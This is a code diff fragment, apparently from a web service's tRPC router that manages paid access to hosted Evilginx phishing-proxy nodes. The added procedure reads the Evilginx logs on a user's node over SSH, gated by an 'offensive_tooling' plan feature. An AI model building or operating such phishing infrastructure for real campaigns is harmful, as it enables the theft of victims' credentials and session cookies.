+    .input(z.object({ lines: z.number().min(1).max(500).default(100) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
+      const script = `journalctl -u evilginx -n ${input.lines} --no-pager 2>/dev/null || tail -${input.lines} /var/log/evilginx.log 2>/dev/null || echo 'No logs found'`;
+      const output = await execSSHCommand(nodeToSSH(node), script, 15000, ctx.user.id);
+      return { logs: output, output };
+    }),
+
+  // ── Legacy compatibility procedures (kept for existing UI) ────────────────
   connectLocal: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
@@ -582,7 +741,7 @@ export const evilginxRouter = router({
       hasPassword: !!node?.sshPassword,
       hasPrivateKey: !!node?.sshKey,
       isLocal: false,
-      version: undefined as string | undefined,
+      version: node?.version,
     };
   }),
 
